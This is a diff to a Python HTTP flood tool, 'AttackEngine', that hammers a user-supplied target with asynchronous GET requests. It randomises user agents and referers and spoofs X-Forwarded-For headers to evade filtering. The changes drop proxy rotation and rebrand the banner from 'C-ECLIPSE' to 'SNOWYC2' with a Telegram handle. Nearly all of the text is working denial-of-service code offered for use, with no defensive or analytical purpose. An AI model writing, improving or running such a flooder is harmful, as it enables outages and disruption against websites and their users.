@@ -24,14 +24,6 @@ def load_referers():
     except:
         return ["https://www.google.com/"]
 
-# Function to load proxies from the file
-def load_proxies():
-    try:
-        with open("proxy.txt", "r") as f:
-            return [line.strip() for line in f if line.strip()]
-    except:
-        return []
-
 class AttackEngine:
     def __init__(self, method, target, duration):
         self.method = method
@@ -39,7 +31,6 @@ class AttackEngine:
         self.duration = duration
         self.start_time = 0
         self.referers = load_referers()
-        self.proxies = load_proxies()
         self.stats = {
             'total': 0,
             'success': 0,
@@ -49,7 +40,7 @@ class AttackEngine:
         }
         self.process = psutil.Process(os.getpid())
 
-    # Function to make the request using proxies
+    # Function to make the request
     async def make_request(self, session):
         headers = {
             "User-Agent": random.choice(USER_AGENTS),
@@ -57,13 +48,8 @@ class AttackEngine:
             "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
         }
 
-        # Choose proxy if available
-        proxy = None
-        if self.proxies:
-            proxy = random.choice(self.proxies)
-        
         try:
-            async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT, proxy=f"http://{proxy}" if proxy else None) as response:
+            async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT) as response:
                 if response.status == 200:
                     return "SUCCESS"
                 elif str(response.status).startswith('4'):
@@ -106,6 +92,8 @@ class AttackEngine:
         ram_used_mb = self.process.memory_info().rss / 1024 / 1024
 
         sys.stdout.write("\033[H\033[J")  # Clear console
+        print(f"\nSNOWYC2 - T.ME/STSVKINGDOM")
+        print("=" * 60)
         print(f"METHOD: {self.method} | TARGET: {self.target} | TIME: {self.duration}s")
         print("=" * 60)
         print(f"REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
@@ -130,10 +118,10 @@ class AttackEngine:
 
 # Main function
 def main():
-    print("C-ECLIPSE ATTACK ENGINE")
-    print("=" * 40)
+    print("\nSNOWYC2 - T.ME/STSVKINGDOM")
+    print("=" * 60)
 
-    # Input method (No longer restricted to C-ECLIPSE only)
+    # Input method
     method = input("METHOD: ").strip()
 
     target = input("TARGET: ").strip()
